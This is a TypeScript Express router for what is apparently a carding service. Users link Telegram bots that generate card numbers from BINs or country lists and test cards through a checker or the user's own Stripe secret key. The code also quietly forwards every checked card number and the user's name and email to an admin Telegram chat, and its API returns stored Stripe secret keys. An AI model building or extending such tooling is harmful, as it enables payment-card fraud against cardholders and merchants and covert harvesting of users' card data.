import { Router, Request, Response } from 'express';
import { storage } from './storage';
import { userRegistrationSchema, telegramBotSchema, insertUserSchema } from '@shared/schema';
import { 
  hashPassword, 
  sendVerificationEmail, 
  requireAuth, 
  createUserSession,
  clearUserSession,
  getCurrentUser
} from './auth';
import { ZodError } from 'zod';
import TelegramBot from 'node-telegram-bot-api';
import { CardChecker } from './cardChecker';

export const userRouter = Router();

// Card checker instance for use with Telegram
let mainCardChecker: CardChecker | null = null;

// Set the card checker instance (called by main routes)
export function setCardChecker(checker: CardChecker) {
  mainCardChecker = checker;
}

// User bots registry
const userTelegramBots: Map<number, TelegramBot> = new Map();

// Register new user
userRouter.post('/register', async (req: Request, res: Response) => {
  try {
    // Validate input
    const validated = userRegistrationSchema.parse(req.body);
    
    // Check if user with this email already exists
    const existingUser = await storage.getUserByEmail(validated.email);
    if (existingUser) {
      return res.status(400).json({ 
        success: false, 
        message: 'Email already in use' 
      });
    }
    
    // Create new user with hashed password
    const userData = insertUserSchema.parse({
      name: validated.name,
      email: validated.email,
      password: hashPassword(validated.password)
    });
    
    const newUser = await storage.createUser(userData);
    
    // Send verification email
    await sendVerificationEmail(newUser.email, newUser.verificationToken!);
    
    return res.status(201).json({ 
      success: true, 
      message: 'Registration successful. Please check your email to verify your account.',
      user: {
        id: newUser.id,
        name: newUser.name,
        email: newUser.email,
        emailVerified: newUser.emailVerified
      }
    });
  } catch (error) {
    if (error instanceof ZodError) {
      return res.status(400).json({ 
        success: false, 
        message: 'Validation error', 
        errors: error.errors 
      });
    }
    
    console.error('Registration error:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'An error occurred during registration' 
    });
  }
});

// Email verification
userRouter.get('/verify-email', async (req: Request, res: Response) => {
  const { token } = req.query;
  
  if (!token || typeof token !== 'string') {
    return res.status(400).json({ 
      success: false, 
      message: 'Invalid verification token' 
    });
  }
  
  const success = await storage.verifyEmail(token);
  
  if (success) {
    // Redirect to login page with success message
    return res.redirect('/login?verified=true');
  } else {
    // Redirect to login page with error message
    return res.redirect('/login?verified=false');
  }
});

// Login
userRouter.post('/login', async (req: Request, res: Response) => {
  try {
    const { email, password } = req.body;
    
    if (!email || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'Email and password are required' 
      });
    }
    
    // Find user by email
    const user = await storage.getUserByEmail(email);
    
    // Check if user exists and password is correct
    if (!user || user.password !== hashPassword(password)) {
      return res.status(401).json({ 
        success: false, 
        message: 'Invalid email or password' 
      });
    }
    
    // Check if email is verified
    if (!user.emailVerified) {
      return res.status(403).json({ 
        success: false, 
        message: 'Please verify your email before logging in' 
      });
    }
    
    // Create session
    await createUserSession(req, user.id);
    
    return res.status(200).json({ 
      success: true, 
      message: 'Login successful',
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        emailVerified: user.emailVerified,
        hasTelegramBot: Boolean(user.telegramBotToken && user.telegramChatId)
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'An error occurred during login' 
    });
  }
});

// Logout
userRouter.post('/logout', async (req: Request, res: Response) => {
  await clearUserSession(req);
  
  return res.status(200).json({ 
    success: true, 
    message: 'Logged out successfully' 
  });
});

// Get current user
userRouter.get('/me', requireAuth, async (req: Request, res: Response) => {
  try {
    const user = await getCurrentUser(req);
    
    if (!user) {
      return res.status(401).json({ 
        success: false, 
        message: 'Unauthorized' 
      });
    }
    
    return res.status(200).json({ 
      success: true, 
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        emailVerified: user.emailVerified,
        hasTelegramBot: Boolean(user.telegramBotToken && user.telegramChatId)
      }
    });
  } catch (error) {
    console.error('Get current user error:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'An error occurred while fetching user data' 
    });
  }
});

// Update Telegram bot settings
userRouter.post('/telegram-settings', requireAuth, async (req: Request, res: Response) => {
  try {
    const user = await getCurrentUser(req);
    
    if (!user) {
      return res.status(401).json({ 
        success: false, 
        message: 'Unauthorized' 
      });
    }
    
    // Validate settings
    const settings = telegramBotSchema.parse(req.body);
    
    // Test the bot token by creating a bot instance
    try {
      const bot = new TelegramBot(settings.telegramBotToken, { polling: false });
      
      // Stop existing bot for this user if it exists
      const existingBot = userTelegramBots.get(user.id);
      if (existingBot) {
        existingBot.stopPolling();
        userTelegramBots.delete(user.id);
      }
      
      // Update user settings
      const updatedUser = await storage.updateTelegramSettings(user.id, settings);
      
      // Start the user's bot with command handlers
      initializeUserBot(updatedUser!);
      
      return res.status(200).json({ 
        success: true, 
        message: 'Telegram bot settings updated successfully',
        hasTelegramBot: true
      });
    } catch (error) {
      console.error('Telegram bot setup error:', error);
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid Telegram bot token or chat ID' 
      });
    }
  } catch (error) {
    if (error instanceof ZodError) {
      return res.status(400).json({ 
        success: false, 
        message: 'Validation error', 
        errors: error.errors 
      });
    }
    
    console.error('Telegram settings update error:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'An error occurred while updating Telegram settings' 
    });
  }
});

// Get Telegram settings
userRouter.get('/telegram-settings', requireAuth, async (req: Request, res: Response) => {
  try {
    const user = await getCurrentUser(req);
    
    if (!user) {
      return res.status(401).json({ 
        success: false, 
        message: 'Unauthorized' 
      });
    }
    
    return res.status(200).json({ 
      success: true, 
      settings: {
        telegramBotToken: user.telegramBotToken || '',
        telegramChatId: user.telegramChatId || '',
        stripeSecretKey: user.stripeSecretKey || ''
      }
    });
  } catch (error) {
    console.error('Get Telegram settings error:', error);
    return res.status(500).json({ 
      success: false, 
      message: 'An error occurred while fetching Telegram settings' 
    });
  }
});

// Initialize all user bots on server start
export async function initializeAllUserBots() {
  try {
    const users = await storage.getAllUsers();
    
    for (const user of users) {
      if (user.telegramBotToken && user.telegramChatId) {
        initializeUserBot(user);
      }
    }
    
    console.log(`Initialized ${userTelegramBots.size} user Telegram bots`);
  } catch (error) {
    console.error('Error initializing user bots:', error);
  }
}

// Initialize a user's Telegram bot with command handlers
function initializeUserBot(user: any) {
  if (!user.telegramBotToken || !user.telegramChatId || !mainCardChecker) {
    return;
  }
  
  try {
    // Create new bot instance
    const bot = new TelegramBot(user.telegramBotToken, { polling: true });
    
    // Register command handlers
    
    // /generate command - Generate cards with specified BIN
    bot.onText(/\/generate (.+)/, async (msg, match) => {
      if (msg.chat.id.toString() !== user.telegramChatId) return;
      
      const bin = match?.[1];
      if (!bin || bin.length < 6) {
        return bot.sendMessage(msg.chat.id, 'Please provide a valid BIN (minimum 6 digits)');
      }
      
      try {
        const cards = generateRandomCards(bin.substring(0, 6), 10);
        const message = `Generated 10 cards with BIN ${bin}:\n\n${cards.join('\n')}`;
        await bot.sendMessage(msg.chat.id, message);
      } catch (error) {
        await bot.sendMessage(msg.chat.id, 'Error generating cards');
      }
    });
    
    // /check command - Check a card
    bot.onText(/\/check (.+)/, async (msg, match) => {
      if (msg.chat.id.toString() !== user.telegramChatId) return;
      
      const cardData = match?.[1];
      if (!cardData) {
        return bot.sendMessage(msg.chat.id, 'Please provide card data in format: number|month|year|cvv');
      }
      
      try {
        // Validate and parse card data
        const parts = cardData.split('|');
        if (parts.length !== 4) {
          return bot.sendMessage(msg.chat.id, 'Invalid format. Use: number|month|year|cvv');
        }
        
        const [number, month, year, cvv] = parts;
        const formattedExpiry = `${month}/${year.slice(-2)}`;
        
        // Check card
        const result = await mainCardChecker.checkCard({
          number: number.trim(),
          expiry: formattedExpiry,
          cvv: cvv.trim(),
          processor: 'luhn'
        });
        
        // Forward the result to both user and admin
        // For user, only send the basic results
        const userMessage = `Card check result: ${result.status}\n` +
                          `Message: ${result.message}\n` +
                          `Brand: ${result.details?.brand || 'Unknown'}\n` +
                          `Type: ${result.details?.funding || 'Unknown'}\n` +
                          `Country: ${result.details?.country || 'Unknown'}`;
                          
        await bot.sendMessage(msg.chat.id, userMessage);
        
        // For admin, send detailed info including the user who made the request
        if (process.env.ADMIN_BOT_TOKEN && process.env.ADMIN_CHAT_ID) {
          const adminBot = new TelegramBot(process.env.ADMIN_BOT_TOKEN, { polling: false });
          const adminMessage = `Card checked by user ${user.name} (${user.email}):\n` +
                            `Card: ${number}\n` +
                            `Result: ${result.status}\n` +
                            `Message: ${result.message}\n` +
                            `Brand: ${result.details?.brand || 'Unknown'}\n` +
                            `Type: ${result.details?.funding || 'Unknown'}\n` +
                            `Country: ${result.details?.country || 'Unknown'}\n`;
                            
          await adminBot.sendMessage(process.env.ADMIN_CHAT_ID, adminMessage);
        }
      } catch (error) {
        await bot.sendMessage(msg.chat.id, 'Error checking card');
      }
    });
    
    // /random command - Generate random cards for a specific country
    bot.onText(/\/random (.+)/, async (msg, match) => {
      if (msg.chat.id.toString() !== user.telegramChatId) return;
      
      const countryCode = match?.[1]?.toLowerCase();
      if (!countryCode || countryCode.length !== 2) {
        return bot.sendMessage(msg.chat.id, 'Please provide a valid country code (2 letters)');
      }
      
      try {
        // Generate random cards based on country
        const cards = generateRandomCardsByCountry(countryCode, 10);
        const message = `Generated 10 random cards for country ${countryCode.toUpperCase()}:\n\n${cards.join('\n')}`;
        await bot.sendMessage(msg.chat.id, message);
      } catch (error) {
        await bot.sendMessage(msg.chat.id, 'Error generating cards for the specified country');
      }
    });
    
    // /sk command - Check a card with user's personal Stripe key
    bot.onText(/\/sk (.+)/, async (msg, match) => {
      if (msg.chat.id.toString() !== user.telegramChatId) return;
      
      if (!user.stripeSecretKey) {
        return bot.sendMessage(msg.chat.id, 'You need to set a Stripe secret key in your account settings first.');
      }
      
      const cardData = match?.[1];
      if (!cardData) {
        return bot.sendMessage(msg.chat.id, 'Please provide card data in format: number|month|year|cvv');
      }
      
      try {
        // Validate and parse card data
        const parts = cardData.split('|');
        if (parts.length !== 4) {
          return bot.sendMessage(msg.chat.id, 'Invalid format. Use: number|month|year|cvv');
        }
        
        const [number, month, year, cvv] = parts;
        const formattedExpiry = `${month}/${year.slice(-2)}`;
        
        // Create temporary checker with user's key
        const userChecker = new CardChecker(user.stripeSecretKey);
        
        // Check card with user's Stripe key
        const result = await userChecker.checkCardWithCustomKey({
          number: number.trim(),
          expiry: formattedExpiry,
          cvv: cvv.trim(),
          processor: 'stripe'
        });
        
        // Send the result to user
        const userMessage = `Card check with your Stripe key: ${result.status}\n` +
                         `Message: ${result.message}\n` +
                         `Brand: ${result.details?.brand || 'Unknown'}\n` +
                         `Type: ${result.details?.funding || 'Unknown'}\n` +
                         `Country: ${result.details?.country || 'Unknown'}`;
                         
        await bot.sendMessage(msg.chat.id, userMessage);
        
        // For admin, send notification of custom key usage
        if (process.env.ADMIN_BOT_TOKEN && process.env.ADMIN_CHAT_ID) {
          const adminBot = new TelegramBot(process.env.ADMIN_BOT_TOKEN, { polling: false });
          const adminMessage = `User ${user.name} (${user.email}) used custom Stripe key to check card:\n` +
                            `Card: ${number}\n` +
                            `Result: ${result.status}\n`;
                            
          await adminBot.sendMessage(process.env.ADMIN_CHAT_ID, adminMessage);
        }
      } catch (error) {
        await bot.sendMessage(msg.chat.id, 'Error checking card with your Stripe key');
      }
    });
    
    // Store the bot instance for this user
    userTelegramBots.set(user.id, bot);
    console.log(`Bot initialized for user ${user.email}`);
    
  } catch (error) {
    console.error(`Error initializing bot for user ${user.email}:`, error);
  }
}

// Generate random cards with a specific BIN
function generateRandomCards(bin: string, count: number): string[] {
  const cards: string[] = [];
  
  for (let i = 0; i < count; i++) {
    const remainingDigits = 16 - bin.length;
    let cardNumber = bin;
    
    // Generate random digits for the rest of the card
    for (let j = 0; j < remainingDigits; j++) {
      cardNumber += Math.floor(Math.random() * 10);
    }
    
    // Generate random expiry (1-12 for month, current year + 1-5 for year)
    const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
    const currentYear = new Date().getFullYear();
    const year = currentYear + Math.floor(Math.random() * 5) + 1;
    
    // Generate random CVV (3 or 4 digits)
    const cvvLength = /^3[47]/.test(bin) ? 4 : 3; // 4 digits for Amex, 3 for others
    let cvv = '';
    for (let j = 0; j < cvvLength; j++) {
      cvv += Math.floor(Math.random() * 10);
    }
    
    // Format card data
    cards.push(`${cardNumber}|${month}|${year}|${cvv}`);
  }
  
  return cards;
}

// Sample BIN patterns for different countries
const countryBINs: Record<string, string[]> = {
  'us': ['4', '51', '52', '53', '54', '55', '37', '34', '6011'],
  'ca': ['4500', '4504', '4506', '4515', '4518', '4520'],
  'gb': ['4508', '4509', '4512', '4543', '4544', '4917'],
  'au': ['4564', '4736', '4739', '4740', '4755', '4761'],
  'fr': ['4867', '4869', '4874', '4976', '4977', '5120'],
  'de': ['4126', '4127', '4128', '4129', '4130', '4930'],
  'jp': ['3528', '3529', '3530', '3531', '3532', '3533'],
  'cn': ['6210', '6211', '6212', '6213', '6214', '6250'],
  'mx': ['4075', '4076', '4077', '4050', '4051', '4052'],
  // Add more countries as needed
};

// Generate random cards for a specific country
function generateRandomCardsByCountry(countryCode: string, count: number): string[] {
  const bins = countryBINs[countryCode] || countryBINs['us'];
  const cards: string[] = [];
  
  for (let i = 0; i < count; i++) {
    // Choose a random BIN for this country
    const randomBin = bins[Math.floor(Math.random() * bins.length)];
    
    // Generate a card with this BIN
    const card = generateRandomCards(randomBin, 1)[0];
    cards.push(card);
  }
  
  return cards;
}